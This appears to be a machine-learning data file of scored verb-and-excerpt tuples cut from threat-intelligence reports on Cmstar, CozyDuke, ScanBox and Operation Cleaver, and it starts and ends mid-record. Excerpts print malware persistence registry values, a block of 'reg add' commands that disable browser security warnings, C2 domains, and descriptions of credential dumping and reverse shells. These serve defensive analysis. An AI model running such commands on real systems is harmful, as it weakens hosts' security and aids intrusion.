key:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ setting the\nkey "bookstore" to the value "regsvr32 %path%\\ctfmonrn.dll /s", which ensures the malware runs every\ntime at system boot')(0.5, 'drops', ' For\ninstance, the "qPd0aKJu.vbs" file MD5:\n\x0c\nE211C2BAD9A83A6A4247EC3959E2A730 drops the following files:\n<list>\nDECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload\nD171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader\n</list>\nThe VBS also adds a registry key:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ setting the\nkey "bookstore" to the value "regsvr32 %path%\\ctfmonrn.dll /s", which ensures the malware runs every\ntime at system boot')(1.0, 'relocate', ' Most Chinese-speaking attackers simply relocate C&C servers to a different place,\nrecompile the malware and carry on as if nothing happened')(0.75, 'drop', '\n\nWe observed several different spear-phishing documents that drop uniquely named payloads')(0.6, 'drops', '\n\n\n<figure></figure>\n\n                              <caption>Cloud Atlas exploit payload - VBScript</caption>\n\nThis VBScript drops a pair of files on disk - a loader and an encrypted payload')(0.6875, 'used', '\n</section>\n\n<section>\n<heading> Conclusion </heading>\n\nThe Cmstar tool has several interesting features, including a previously unseen method of manually\ncreating its import address table using an API function name character to offset mapping techniques, and\na hashing algorithm used to find antivirus processes on an infected system')(0.6, 'gathers', '\n</section>\n\n<section>\n<heading> Hashing Process Names </heading>\n\nAs mentioned in the behavioral analysis section, the Cmstar downloader gathers system-specific\ninformation to send to the C2 server')(1.0, 'writes', ' Cmwhite Tools Using “cgl-bin” within HTTP Requests </caption>\n\nCmstar’s HTTP POST requests sent to ‘happy.launchtrue[.]com’ contain data that the Trojan gathers from\nthe infected machine that has the following structure:\n\n<Windows Version number>@@<CPU Architecture (2 for x64, 1 for x86)>??<boolean for elevated\nprivileges>]]**<boolean if antivirus processes are found>!!<static version string>==\n\nIn one example, Unit 42 observed the following data within an analysis environment, which was then\nencrypted using a single-byte XOR algorithm and a key of 0x45 before being sent to the C2 server:\n\x0c510@@1??1]]**0!!150316o==\n\nHelpfully, the malware author writes log messages to the ‘DF64159.TMP’ file, used for debugging purposes\nthroughout the execution of the Cmstar downloader')(0.36363636363636365, 'create', ' The encrypted strings within the Trojan include fields used within the\nHTTP requests that Cmstar will create to communicate with its C2 server, as well as additional strings\nused to interact with the registry')(0.5454545454545454, 'drop', '<doc>\n<section>\n<heading> Cmstar Downloader: Lurid and Enfal’s New Cousin </heading>\nIn recent weeks, Unit 42 has been analyzing delivery documents used in spear-phishing attacks that drop\na custom downloader used in cyber espionage attacks')(0.3333333333333333, 'sending', ' However, the code does not decrypt, reference, or use the following registry key in any way, which\nsuggests that the malware author left this artifact in the code after swapping to the run key listed above:\n\n      HKCU\\Software\\Microsoft\\CTF\\LangBarAddIn\n\x0cCmstar also decrypts a 752-byte piece of shellcode that carries out communications with the C2 server,\nspecifically by sending HTTP POST requests to the following URL:\n\n      http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi\n\nIt should be noted that the C2 URL contains the string ‘cgl-bin’, which visually resembles the common cgi-\nbin folder used by many webservers to run server-side scripts')(0.7692307692307693, 'uses', ' The embedded configuration contains nothing more than a URL that Cmstar uses as its\ncommand and control (C2) location')(1.0, 'creates', ' The Cmstar sample associated with the MNKIT delivery document\ncreates the following registry key to automatically execute at system startup:\n\n      HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xpsfiltsvcs: “rundll32.exe\n      C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\xpsfiltsvcs.dll,XpsRegisterServer”\n\nUnit 42 found an additional encrypted registry key that would allow Cmstar to automatically start up after\nreboots')(0.25, 'creates', ' Once again, it creates several registry entries with the help of the command line tool and\ncreates an instance of the Internet Explorer (CoCreateInstance() -> d30c1661-cdaf-11d0-8a3e-\n00c04fc9e26e) for contacting the C&C server')(0.5, 'contacting', ' Once again, it creates several registry entries with the help of the command line tool and\ncreates an instance of the Internet Explorer (CoCreateInstance() -> d30c1661-cdaf-11d0-8a3e-\n00c04fc9e26e) for contacting the C&C server')(0.75, 'downloads', ' As a result, we get the following\nnetwork information:\n\n<list>\nC&C server: defense.miraclecz.com (IP: 208.115.124.83)\nHTTP GET request: /index.asp?id=50100\n</list>\n\nAlso, we see that it downloads some kind of data (Base64 encoded)')(0.5, 'retrieve', ' It also tries to retrieve possible AntiVirus information by\nusing the COM interface (dc12a687-737f-11cf-884d-00aa004b2e24 -> IWbemLocator -> SELECT *\nFROM AntiVirusProduct)')(0.6, 'adding', ' The important strings are as follows:\n\n<code>\n\nSELECT * FROM AntiVirusProduct\nreg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v PrivDiscUiShown /t\nREG_DWORD /d 1 /f\nreg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v DEPOff /t REG_DWORD /d 1 /f\nreg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v DisableFirstRunCustomize /t\nREG_DWORD /d 2 /f\nreg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v Check_Associations /t REG_SZ /d no\n/f\nreg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main"\n\x0c\nreg add "HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter" /v ShownVerifyBalloon /t\nREG_DWORD /d 3 /f\nreg add "HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter" /v Enabled /t REG_DWORD /d\n1 /f\nreg add "HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter"\nreg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v\nWarnOnPostRedirect /t REG_DWORD /d 0 /f\nreg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v\nWarnonZoneCrossing /t REG_DWORD /d 0 /f\nreg add "HKCU\\Software\\Microsoft\\Internet Connection Wizard" /v AutoRecover /t REG_DWORD /d\n2 /f\nreg add "HKCU\\Software\\Microsoft\\Internet Connection Wizard" /v Completed /t REG_BINARY /d 1\n/f\n\\cmd.exe\n\n</code>\n\nTogether with the output of IDA Pro, we can see that this malware uses the command line tool cmd.exe for\nadding several registry keys to Internet Explorer')(0.6, 'launch', ' Furthermore, it makes use of the COM to launch an instance of Internet\nExplorer (d30c1661-cdaf-11d0-8a3e-00c04fc9e26e -> IWebBrowser2), supposedly to contact its C&C\nserver')(0.5, 'contact', ' Furthermore, it makes use of the COM to launch an instance of Internet\nExplorer (d30c1661-cdaf-11d0-8a3e-00c04fc9e26e -> IWebBrowser2), supposedly to contact its C&C\nserver')(1.0, 'contacted', " The\ndynamic analysis showed the malware sample contacted the C&C server, but wasn't sending any URL\nparameters (id1, id2)")(0.8571428571428571, 'use', ' Finally, the\n dropper will use the copy of rundll32.exe to load and\n execute the CozyDuke main component')(0.5714285714285714, 'checking', '                \n                                                              \n\n                                                              \n   <caption> FIGURE 2: THE COZYDUKE INFECTION FLOW </caption>                    \n              <figure>                                                \n                         ZIP file                             \n                                                              \n                                          Malicious link      \n               Downloads                                      \n                                                              \n                                                              \n                         ZIP file\n                                                              \n                                                              \n                   Extracts                                   \n                                                              \n                    Self-extracting                           \n                          RAR                                 \n                                                              \n\n                                                              \n            Extracts                  Extracts                \n                                                              \n                                                              \n                                                              \n                                                              \n                                                              \n    CozyDuke main dropper             Decoy document\n\n\n\n\n      Encrypted     CozyDuke\n     configuration components\n          file\n</figure>\n\n <heading> COZYDUKE MAIN DROPPER </heading>\n The main CozyDuke dropper, used for infecting hosts\n with CozyDuke, begins by checking whether the victim\n has an anti-virus product installed')(0.6666666666666666, 'executed', ' Secondly, we also have reason to\n believe CozyDuke has, in some instances, downloaded\n and executed droppers for DLL files reminiscent of\n OnionDuke')(0.5, 'downloaded', ' Secondly, we also have reason to\n believe CozyDuke has, in some instances, downloaded\n and executed droppers for DLL files reminiscent of\n OnionDuke')(0.7857142857142857, 'executed', ' The main component is executed by         \nthe CozyDuke dropper using a copy of rundll32.exe')(0.5, 'executing', '           \nThe CozyDuke toolset also includes multiple kinds                \nof droppers for infecting hosts with CozyDuke or for             \nexecuting additional tools from the CozyDuke toolset')(0.8461538461538461, 'involve', '\n These tasks usually involve the execution of modules or\n executables providing additional functionality')(0.375, 'gathering', '\n    The CozyDuke toolset, which we believe has been\n    under active development since at least 2011,\n    consists of tools for infecting targeted hosts,\n    establishing and maintaining backdoor access to the\n    hosts, gathering information from them and gaining\n    further access to other hosts inside the victim\n    organization')(0.7857142857142857, 'gaining', '\n    The CozyDuke toolset, which we believe has been\n    under active development since at least 2011,\n    consists of tools for infecting targeted hosts,\n    establishing and maintaining backdoor access to the\n    hosts, gathering information from them and gaining\n    further access to other hosts inside the victim\n    organization')(0.8461538461538461, 'copy', ' The dropper\n will additionally copy the system file rundll32.exe to the\n install location for CozyDuke')(0.2857142857142857, 'write', ' The second category consists   \nof PE executable files that CozyDuke will write to disk  \nand execute on the infected host')(0.7142857142857143, 'execute', ' The second category consists   \nof PE executable files that CozyDuke will write to disk  \nand execute on the infected host')(0.8, 'ensure', '\n Newer versions of the dropper will perform additional\n checks to ensure the dropper is not being executed inside\n a virtual machine or a known malware analysis sandbox\n environment')(0.36363636363636365, 'register', '\n  CozyDuke may also register itself as a Windows service\n  or scheduled task')(0.7142857142857143, 'write', ' Upon execution, it will write two files to disk')(0.38461538461538464, 'modify', ' CozyDuke will modify the\n  registry entries in such a way that any loading of the\n  SharedTaskScheduler COM object will first load a special\n  CozyDuke module that will ensure CozyDuke stays active\n  on the victim host')(0.6666666666666666, 'gathering', '            \nFinally, the CozyDuke toolset includes tools and scripts –       \nsome custom-written, others based on openly available            \ntools – that are used for purposes such as gathering\nfurther information from infected hosts or for infecting         \nadditional hosts in the same target organization')(0.5, 'spread', '\n                                                                 \n                                                                 \n<heading> ATTACK OVERVIEW </heading>                                                 \n                                                                 \n<heading> Infection vector </heading>                                                 \nWe have observed CozyDuke being spread via email,                \nwhich usually contain a link to a compromised website            \nhosting a ZIP file (although in at least one case, the file was  \nhosted on Dropbox)')(0.25, 'are', '                                      \n                                                            \nThe most important functionalities offered by the main      \ncomponent are establishment of persistence, gathering       \nof basic system information, communication with the C&C     \nserver and the execution of additional tasks, modules or    \nexecutables as commanded by the C&C server')(0.75, 'execute', ' These files contain an executable            \nthat, upon execution, will write to disk and execute             \nCozyDuke, while at the same time presenting the user             \nwith a decoy to divert attention')(1.0, 'write', ' These files contain an executable            \nthat, upon execution, will write to disk and execute             \nCozyDuke, while at the same time presenting the user             \nwith a decoy to divert attention')(0.8, 'write', '\n The dropper will then proceed to write the CozyDuke\n components to the specified location')(0.36363636363636365, 'adding', ' Firstly,\nCozyDuke may set itself to be executed at system startup    \nby adding a registry value under any of the following       \nregistry keys:                                              \n<list>\n    •\t HKLM\\Software\\Microsoft\\Windows\\                     \n       CurrentVersion\\Run\\                                  \n    •\t HKCU\\Software\\Microsoft\\Windows\\                     \n       CurrentVersion\\Run\\                                  \n\n\n                     <figure></figure> <caption> FIGURE 3: SCREENSHOT OF A DECRYPTED COZYDUKE CONFIGURATION FILE </caption>\n\n    •  HKLM\\Software\\Microsoft\\Windows\\\n       CurrentVersion\\Policies\\Explorer\\Run\n    •  HKCU\\Software\\Microsoft\\Windows\\\n       CurrentVersion\\Policies\\Explorer\\Run\n</list>\n  The name of the registry value will usually be the\n  filename, (without the extension) of the CozyDuke main\n  component')(0.7777777777777778, 'drop', ' In this case, however, instead of dropping\nCozyDuke, the executables may drop other executables,    \nscripts or DLLs')(0.7, 'is', '\n Tasks\n CozyDuke’s primary purpose is the execution of tasks')(0.3333333333333333, 'extending', ' The first consists of CozyDuke modules   \nwhich are DLL files loaded in memory by the main         \ncomponent of CozyDuke for the purposes of extending      \nCozyDuke’s functionality')(0.7777777777777778, 'write', ' This dropper will then proceed to         \nwrite to disk the main CozyDuke components as well as an      \nencrypted configuration file used by CozyDuke')(0.8888888888888888, 'included', ' In the cases we have observed, the               \n  configuration data for any single CozyDuke instance has              \n  included the details of either one or two C&C servers')(0.2222222222222222, 'tracking', ' An example list is\n   shown in the following screenshot:\n\n\n\n<footnote>\n   1 http://pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-\n   1.html\n   2 https://www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering-\n\n   hole-attacks\n</footnote>\n\n\n<footer> Cyber Threat Operations </footer>\n\n<header> \x0c   Tactical Intelligence Bulletin – TLP:WHITE </header>\n\n\n\n\n   <heading> checkDrives </heading>\n   In one cluster of ScanBox activity, instead of checking for specific files as per the method above, the\n   attackers have implemented a different method of tracking files and drives present on the victim machine')(0.7777777777777778, 'contain', ' However one group of attackers using\n   the ScanBox framework are now actively sending e-mails to potential victims, where the e-mails contain\n   links to websites hosting ScanBox')(0.6, 'perform', '\n\n   For those who didn’t read our last entry on the framework, nor the excellent work by Jaime Blasco2 which\n   preceded it, ScanBox is a framework written in JavaScript and PHP which allows an attacker to perform\n   reconnaissance and key logging of visitors to compromised websites without requiring any malware to be\n   downloaded or installed')(0.8, 'being', '\n\n\n\n\n<footer> Cyber Threat Operations </footer>\n\n<header> \x0c   Tactical Intelligence Bulletin – TLP:WHITE </header>\n\n   Whilst macanna.com[.]tw appears to be a legitimate site, it has also been observed as being a command\n   and control destination for malware')(0.45454545454545453, 'performs', '\n\n      ScanBox performs keylogging of users when they visit a compromised website, without requiring malware\n      to be deployed, and can collect a great deal of information which can be used to tailor future attacks\n\n      In October we published some details of the ScanBox tool set')(0.6818181818181818, 'make', '\n\nBased upon some cursory analysis the backdoor will look for encrypted commands within HTML comments\nreturned from the C2 using the following format: "<!\xad\xad?*$@COMMAND\xa0GOES\xa0HERE@$*?\xad\xad!>;"however,\nthe C2 was not active at the time of analysis so this could not be confirmed.\xa0 The backdoor may also make\nrequests to the C2 over HTTP using the following parameters in the URI string "query?sid=" and "result?\nsid=".\xa0\n\nThe PDB path, C:\\Codes\\Eoehttp\\Release\\Eoehttp.pdb, was also left in the backdoor although no\nother instances of this path could be identified.\xa0 Several additional exploit documents were identified by\ninvestigating the domains "fighthard.mooo.com" and "rampage.freetcp.com"')(1.0, 'spawning', ' The\nbackdoor routine exists inside the DllMain function so when explorer.exeloads the backdoor via\nLoadLibrary it will begin spawning malicious threads.\xa0\n\nA PDB path was also left in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb; A quick\ngoogle search will lead you to a YARA rule written by Patrick Olsen and the very similar sample\n869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80')(0.46153846153846156, 'load', ' Interestingly the backdoor will also load the legitimate\nsystem32\\msacm32.drv\xa0file resolve functions and pass calls to it so it doesn\'t break audio playback on the\nvictim system.\xa0 The backdoor contains identical exports as well as an additional dummy function from the\nlegitimate msacm32.drvcalled "StartWork" which can be used to reliably identify similar samples')(0.52, 'contains', ' Interestingly the backdoor will also load the legitimate\nsystem32\\msacm32.drv\xa0file resolve functions and pass calls to it so it doesn\'t break audio playback on the\nvictim system.\xa0 The backdoor contains identical exports as well as an additional dummy function from the\nlegitimate msacm32.drvcalled "StartWork" which can be used to reliably identify similar samples')(0.5333333333333333, 'communicate', ' The binary is configured to communicate to "www.microsoftservices.proxydns.com"\non port 80 using standard HTTP POST and GET requests')(0.6666666666666666, 'load', '\n\nOn reboot explorer.exe\xa0was now happy to load the backdoor and get down to business; this technique is\nknown as dll search order hijacking or binary planting')(0.1111111111111111, 'execute', ' \xa0The decoded binary will be written to the filesystem as\n"%APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx".\xa0\xa0\n\nFile Details\n\nFull File Path      %APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\xa0\nSHA256              9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165\xa0\nFile Size           107,008 bytes\xa0\nCompile Time        2/4/2015 8:41:42 UTC\n\x0c\xa0\n\n\n\n\nThe malware does not execute immediately after successful exploitation and instead just creates a Run key\nin the current user\'s hive which will execute the next time the victim user accesses the system.\xa0\xa0\n\nRegistry Persistence Key     \xa0 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates\xa0\nRegistry Key Value           \xa0 Rundll32.exe "%APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx",Setup\n\xa0\n\nThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete,\nsearch, and execute files as well as list drivers on the system')(0.3333333333333333, 'download', ' \xa0The decoded binary will be written to the filesystem as\n"%APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx".\xa0\xa0\n\nFile Details\n\nFull File Path      %APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\xa0\nSHA256              9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165\xa0\nFile Size           107,008 bytes\xa0\nCompile Time        2/4/2015 8:41:42 UTC\n\x0c\xa0\n\n\n\n\nThe malware does not execute immediately after successful exploitation and instead just creates a Run key\nin the current user\'s hive which will execute the next time the victim user accesses the system.\xa0\xa0\n\nRegistry Persistence Key     \xa0 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates\xa0\nRegistry Key Value           \xa0 Rundll32.exe "%APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx",Setup\n\xa0\n\nThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete,\nsearch, and execute files as well as list drivers on the system')(0.47619047619047616, 'creates', ' \xa0The decoded binary will be written to the filesystem as\n"%APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx".\xa0\xa0\n\nFile Details\n\nFull File Path      %APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\xa0\nSHA256              9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165\xa0\nFile Size           107,008 bytes\xa0\nCompile Time        2/4/2015 8:41:42 UTC\n\x0c\xa0\n\n\n\n\nThe malware does not execute immediately after successful exploitation and instead just creates a Run key\nin the current user\'s hive which will execute the next time the victim user accesses the system.\xa0\xa0\n\nRegistry Persistence Key     \xa0 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates\xa0\nRegistry Key Value           \xa0 Rundll32.exe "%APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx",Setup\n\xa0\n\nThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete,\nsearch, and execute files as well as list drivers on the system')(0.9545454545454546, 'is', '\n</section>\n\n\n\n<footer>35</footer>\n\x0c\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>PRIVILEGE ESCALATION & PIVOTING</heading>\nPrivilege escalation is a category of techniques that describe the process of going from a less\nprivileged user on a compromised computer to a more privileged user')(0.6, 'request', '\ntmu</string><string>[ALL]__b93c-49a1-140914090807__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103605__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103610__[00000000000000000000000000000000].tmu</string></\nGetFileListResult></GetFileListResponse></soap:Body></soap:Envelope>\n</code>\n\nIn order to download the file and parse for commands to execute, the TinyZBot must request the\nfile')(0.3, 'download', '\ntmu</string><string>[ALL]__b93c-49a1-140914090807__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103605__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103610__[00000000000000000000000000000000].tmu</string></\nGetFileListResult></GetFileListResponse></soap:Body></soap:Envelope>\n</code>\n\nIn order to download the file and parse for commands to execute, the TinyZBot must request the\nfile')(0.7916666666666666, 'allows', ' Double encoding\nSQL injection payloads allows for bypassing of various anti-exploitation filters, such as those\nsupplied by Web Application Firewalls (WAFs)')(0.17647058823529413, 'utilized', '\n\n</section>\n\n\n<footer>41</footer>\n\x0c\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure> \n\n</header>\n<section>\n<heading>Anonymous FTP Servers</heading>\nCleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access\nenabled in order to pilfer large quantities of information')(0.6153846153846154, 'allowed', ' These are scripts or applications that allowed\n  for command or code execution outside of the victim network')(1.0, 'sent', '\n\nFor the command and control examples below, red text represents TCP data sent from the\nTinyZBot infection while blue text represents TCP data sent from the command and control\nserver')(0.7142857142857143, 'making', ' This zhCat\n  instance is running cmd.exe, effectively making it a reverse connecting shell')(0.5454545454545454, 'using', ' A command and control protocol was established, using HTTP and SOAP for the\n protocol')(0.75, 'see', '\n\n</section>\n<footer>44</footer>\n\x0c\n<header>#OPCLEAVER</header>\n<section>\n\n <heading>zhCat (cont.)</heading>\n\n<figure></figure>\n\n Upon inspecting the network traffic again, we see the following HTTP POST request')(0.6153846153846154, 'leverages', ' PrivEsc is a compiled exploit, which leverages\nthe vulnerability commonly referred to as KiTrap0D (CVE-2010-0232)')(1.0, 'established', ' 73\n</toc>\n\n\n\n<footer>4</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>EXECUTIVE SUMMARY</heading>\n  Since at least 2012, Iranian actors have directly attacked,\n  established persistence in, and extracted highly sensitive\n  materials from the networks of government agencies and major\n  critical infrastructure companies in the following countries:\n  Canada, China, England, France, Germany, India, Israel,\n  Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea,\n  Turkey, United Arab Emirates, and the United States')(0.14285714285714285, 'extracted', ' 73\n</toc>\n\n\n\n<footer>4</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>EXECUTIVE SUMMARY</heading>\n  Since at least 2012, Iranian actors have directly attacked,\n  established persistence in, and extracted highly sensitive\n  materials from the networks of government agencies and major\n  critical infrastructure companies in the following countries:\n  Canada, China, England, France, Germany, India, Israel,\n  Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea,\n  Turkey, United Arab Emirates, and the United States')(0.75, 'execute', ' This can make it useful for tools like the PVZ tool chain and Csext to execute\nwith logged results:\n\n\n<figure></figure>\n\n                          <caption>Figure 22: The MimikatzWrapper dumps credentials out to a file.</caption>\n</section>\n\n\n<footer>38</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PsExec Spreading</heading>\n  Once an attacker has credentials extracted from the cache, whether in hash form or in plaintext\n  form, PsExec can be used to run commands on any other computer which accepts those domain\n  credentials')(0.5714285714285714, 'extracted', ' This can make it useful for tools like the PVZ tool chain and Csext to execute\nwith logged results:\n\n\n<figure></figure>\n\n                          <caption>Figure 22: The MimikatzWrapper dumps credentials out to a file.</caption>\n</section>\n\n\n<footer>38</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PsExec Spreading</heading>\n  Once an attacker has credentials extracted from the cache, whether in hash form or in plaintext\n  form, PsExec can be used to run commands on any other computer which accepts those domain\n  credentials')(0.8461538461538461, 'run', ' This can make it useful for tools like the PVZ tool chain and Csext to execute\nwith logged results:\n\n\n<figure></figure>\n\n                          <caption>Figure 22: The MimikatzWrapper dumps credentials out to a file.</caption>\n</section>\n\n\n<footer>38</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PsExec Spreading</heading>\n  Once an attacker has credentials extracted from the cache, whether in hash form or in plaintext\n  form, PsExec can be used to run commands on any other computer which accepts those domain\n  credentials')(0.5833333333333334, 'is', ' This keystroke logger source is publicly\n  available and referred to as DeadkeyLogger')(0.3684210526315789, 'repeats', ' This\n  copy repeats the behavior of the original, but with already discovered credentials as well as\n  newly discovered ones on the newly infected host')(1.0, 'opened', ' When early versions of TinyZBot were executed, they opened an image stored\n  in the resource section of the executable and copied the malicious TinyZBot executable to the\n  %AppData% directory')(0.8, 'copied', ' When early versions of TinyZBot were executed, they opened an image stored\n  in the resource section of the executable and copied the malicious TinyZBot executable to the\n  %AppData% directory')(0.4444444444444444, 'has', ' It also has a remotely installable trojan named Abel, which\n  enables some of its functionality on a remote target')(0.8666666666666667, 'enables', ' It also has a remotely installable trojan named Abel, which\n  enables some of its functionality on a remote target')(0.5, 'regain', ' This gives the attackers a\n  predictable method to regain access to a compromised network if they ever lose access')(0.07692307692307693, 'leveraged', '\n •\t Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and\n    Windows privilege escalations, and were coupled with automated, worm-like propagation\n    mechanisms')(0.7142857142857143, 'communicate', '\n\n  We have seen Csext configured to communicate with the following servers:\n<list>\n  • 78.47.102.90, Germany, srv01.microsoftwindowsupdate(dot)net\n  • 174.36.195.158, Washington D.C, USA, srv01.microsoftupdateserver(dot)\n  net\n</list>\n</section>\n\n\n\n<footer>59</footer>\n\x0c\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n<cover>\n \n                      <heading>MITIGATION</heading>\n\n\n                  <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n\n                                                  #OPCLEAVER\n</cover>\n<footer>60</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>MITIGATION</heading>\n  If after reviewing the Indicators of Compromise (IOC) listed in Appendix A, you believe your\n  organization to be a victim of Operation Cleaver, we recommend you consider the following course\n  of action:\n\n  1')(0.6, 'logs', '\n\n<figure></figure>\n\n\n                                       <caption>Figure 21: The MimikatzWrapper.</caption>\n\nThe only external difference is that MimikatzWrapper also logs these results to res.txt in the\nexecuting directory')(1.0, 'were', ' Many of their backdoors were web\n  applications, added to web servers, so commands can be executed from a browser or client able\n  to communicate with them')(0.47368421052631576, 'using', ' WndTest starts using PHP servers for its command and control\nserver, some of which are listed as defaced sites')(0.3333333333333333, 'use', ' The Operation Cleaver team was\nobserved attempting to use NetCat to exfiltrate information as well as use it as a reverse\nconnecting shell')(1.0, 'limit', ' This was presumably done to limit antivirus detection of each individual file as\n  well as allow for dynamic updating of specific modules')(0.2222222222222222, 'jump', ' If this technique is combined with cached credential dumping, it can be used to jump\n  from computer to computer on a compromised network')(0.8461538461538461, 'uses', '\n                            \n Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers')(0.8, 'compromise', '\n\n</section>\n\n\n<footer>10</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n <heading>Indicators of Compromise (IOC)</heading>\n •\t Private signing certificates of one victim were captured allowing the Operation Cleaver team to\n    compromise the entirety of their organization')(0.7, 'extracting', ' It starts by\n  first extracting cached credentials from the infected computer’s cache')(0.8571428571428571, 'gather', ' The purpose of TinyZBot is to gather\n  information from an infected computer as well as maintain and further access into a compromised\n  network')(1.0, 'utilizes', '\n</section>\n\n<section>\n  <heading>NetC (Net Crawler)</heading>\n  Net Crawler utilizes a cached credential dumping technique along with PsExec in order to\n  worm throughout a network, collecting any and all credentials that it can extract from credential\n  caches')(0.16666666666666666, 'worm', '\n</section>\n\n<section>\n  <heading>NetC (Net Crawler)</heading>\n  Net Crawler utilizes a cached credential dumping technique along with PsExec in order to\n  worm throughout a network, collecting any and all credentials that it can extract from credential\n  caches')(0.7333333333333333, 'collecting', '\n</section>\n\n<section>\n  <heading>NetC (Net Crawler)</heading>\n  Net Crawler utilizes a cached credential dumping technique along with PsExec in order to\n  worm throughout a network, collecting any and all credentials that it can extract from credential\n  caches')(1.0, 'logging', ' It was limited to logging keystroke data, sending emails, and creating\n a link in the user’s startup folder for persistence')(0.8333333333333334, 'creating', ' It was limited to logging keystroke data, sending emails, and creating\n a link in the user’s startup folder for persistence')(0.6666666666666666, 'sending', ' It was limited to logging keystroke data, sending emails, and creating\n a link in the user’s startup folder for persistence')(0.29411764705882354, 'allowing', ' They achieved complete access to airport gates and their security\n control systems, potentially allowing them to spoof gate credentials')(1.0, 'achieved', ' They achieved complete access to airport gates and their security\n control systems, potentially allowing them to spoof gate credentials')(0.3333333333333333, 'dump', ' It has the ability to dump stored and\n  cached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials\n  being transmitted on the network')(1.0, 'conduct', ' It has the ability to dump stored and\n  cached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials\n  being transmitted on the network')(0.6666666666666666, 'capture', ' It has the ability to dump stored and\n  cached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials\n  being transmitted on the network')(0.9166666666666666, 'makes', '\n  This makes the traffic between zhCat instances look like benign HTTP traffic')(0.5, 'conducting', '\nThey were observed conducting SQL injections, controlling backdoors, as well as exfiltrating\ninformation using this address, and the address appears in multiple software configurations\nrecovered from staging servers over a period of time')(0.3333333333333333, 'controlling', '\nThey were observed conducting SQL injections, controlling backdoors, as well as exfiltrating\ninformation using this address, and the address appears in multiple software configurations\nrecovered from staging servers over a period of time')(0.2727272727272727, 'exhibits', '\n</section>\n<footer>20</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>Shell Creator 2 (cont.)</heading>\n\n\n<figure></figure>\n\n          <caption>Figure 6: Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran.</caption>\n\n\n<figure></figure>\n\n                                          \n              <caption>Figure 7: Shell Creator 2 notifies the user in green when their source IP address is not Iran.</caption>\n\n</section>                               \n\n<section>\n  <heading>Net Crawler</heading>\n                       \n  Net Crawler is a tool developed in C# that exhibits worm-like behavior in order to gather cached\n  credentials from any and all accessible computers on an infected network')(0.75, 'gather', '\n</section>\n<footer>20</footer>\n\x0c\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>Shell Creator 2 